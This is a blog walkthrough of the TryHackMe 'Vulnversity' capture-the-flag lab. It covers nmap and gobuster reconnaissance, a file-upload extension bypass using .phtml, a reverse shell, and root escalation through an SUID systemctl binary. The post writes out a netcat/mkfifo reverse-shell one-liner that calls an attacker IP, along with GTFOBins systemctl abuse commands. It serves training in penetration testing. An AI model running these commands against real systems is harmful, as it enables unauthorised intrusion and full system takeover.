---
title: "Vulnversity"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="vulnversity.png" width=200 height=200 alt="vulnversity">

Welcome to your first lecture! if you wanna graduate from vulnversity you need to know some basics. Take a seat!

The course starts now

## Reconnaissance

The very first step is gathering informations about your target

Its primordial and probably the most valuable step

### nmap

```
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.3

22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB

139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

3128/tcp open  http-proxy  syn-ack Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

3333/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h42m39s, deviation: 2h53m13s, median: 2m39s
| smb2-time: 
|   date: 2022-01-22T15:14:47
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-01-22T10:14:45-05:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59436/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 39429/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44245/udp): CLEAN (Timeout)
|   Check 4 (port 10751/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```
### gobuster

```
└──╼ $gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.173.218:3333
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.173.218:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/22 16:23:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.173.218:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.173.218:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.173.218:3333/images/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.173.218:3333/internal/]
/index.html           (Status: 200) [Size: 33014]                                        
/js                   (Status: 301) [Size: 318] [--> http://10.10.173.218:3333/js/]      
...                                                        
                                                                                         
===============================================================
2022/01/22 16:25:37 Finished
===============================================================

```
## Getting access

upon visiting the `internal` dir we get file upload 

But obviously `.php` is not allowed (that would be trivial)

so using burpsuite sniper we fuzz for allowed extensions and `.phtml` is our answer

upload it and prepare your listenner

visit `http://10.10.153.97:3333/internal/uploads/reverse-shell.phtml`

Get access on your listenner. Now you are in

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 35656
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:50:04 up 2 min,  0 users,  load average: 1.51, 1.23, 0.51
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

```
Meet `bill` and get the user flag

```
$ cd /home
$ ls
bill
$ cd bill
$ ls
user.txt
$ cat user.txt       
user_flag_for_50_points_on_100
```

## privilege escalation

One of our favorite part. Its time to get ultimate privileges by becoming root

We usually check `sudo` first but this lesson will cover the next step

Looking for SUID! the hint command is very simple but does not filter errors

you can look for more ways to look for SUID/GUID in the linux privilege escalation room

Or on google

```
$ find / -perm -u=s 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

Simple yet efficient...If you understood clearly what SUID was

Or if you had more experience

you would be surprised by the presence of `/bin/systemctl` in that list

you should also make yourself more familiar with [Gtfobbins](https://gtfobins.github.io/)

They specialized in common privilege escalation vectors and binaries like systemctl

Those are the commands they proposed for this one

```
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

But as we are not script kiddies (ugh)...we nderstand we cannot just copy-paste it

We understand what it does and modify it accordingly

First we need a better shell (with TTY)

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnuniversity:/home/bill$ 

```
Then we paste this instead for a reverse shell

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.226.203 4444 >/tmp/f"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
You might need to restart systemctl again using

`/bin/systemctl enable --now $TF`

you will then almost immediately get a root shell on your listener

you prepared a listener right?

if so, you deserve that flag!

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 35674
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
root_flag_for_100_percent
```

voilà! congratulations student! 

you did it this far, so you can go further!

practice other rooms to get comfortable with what was covered here

and of course never stop learning!

class dismissed!